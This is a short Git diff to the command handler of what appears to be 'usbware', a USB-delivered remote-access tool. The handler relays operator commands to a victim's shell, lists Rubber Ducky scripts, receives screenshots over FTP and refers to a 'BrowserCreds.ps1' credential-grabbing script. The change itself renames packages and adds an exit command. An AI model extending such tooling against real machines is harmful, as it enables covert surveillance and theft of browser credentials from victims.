@@ -1,8 +1,8 @@
-package thatcherdev.usbware.usbware;
+package com.github.thatcherdev.usbware.usbware;
 
 import java.util.ArrayList;
 import java.util.Arrays;
-import thatcherdev.usbware.backend.FTP;
+import com.github.thatcherdev.usbware.backend.FTP;
 
 public class HandleCommand {
 
@@ -28,7 +28,6 @@ public class HandleCommand {
 			else if(command.equals("ds"))
 				Shell.out.println("cmd cd scripts && dir/b/a:-d *.duck");
 			ArrayList<String> scripts=new ArrayList<String>(Arrays.asList(getResp().split("\n")));
-			scripts.remove("powershell.duck");
 			scripts.remove("BrowserCreds.ps1");
 			scripts.remove("File Not Found");
 			if(scripts.size()==0)
@@ -71,7 +70,9 @@ public class HandleCommand {
 			System.out.println("Receiving screenshot to '"+System.getProperty("user.dir")+"\\screenshot.png'...");
 			FTP.shell("screenshot.png", "rec");
 			System.out.println(getResp());
-		}else{
+		}else if(command.equals("exit"))
+			System.exit(0);
+		else{
 			Shell.out.println(command);
 			System.out.println(getResp());
 		}
